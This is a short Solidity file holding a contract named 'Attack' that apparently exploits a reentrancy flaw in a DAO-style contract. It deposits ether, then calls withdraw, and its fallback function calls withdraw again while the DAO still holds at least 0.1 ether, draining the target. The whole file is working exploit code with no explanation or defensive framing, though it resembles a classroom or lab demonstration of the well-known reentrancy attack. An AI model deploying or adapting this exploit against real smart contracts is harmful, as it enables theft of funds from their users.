// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface Dao_inf{
    function deposit() external payable;
    function withdraw() external;
    function daoBalance() external view returns(uint256);    
}
contract Attack{
    Dao_inf mydao; 

    constructor(address _address){
        mydao = Dao_inf(_address);
    }
    function deposit() public payable {
        // Seed the Dao with at least 0.1 Ether.
        require(msg.value >= 0.1 ether, "Need at least 0.1 ether to commence attack.");
        mydao.deposit{value: msg.value}();
    }
    function attack() public {
        // Withdraw from Dao.
        mydao.withdraw();
    }

    fallback() external payable{
        if(mydao.daoBalance() >= 0.1 ether){
            mydao.withdraw();
        }
    }
    // receive() external payable{
    //     (bool sent, ) = msg.sender.call{value: 0.1}("");
    //     require(sent, "Failed to withdraw sender's balance");
    // }
}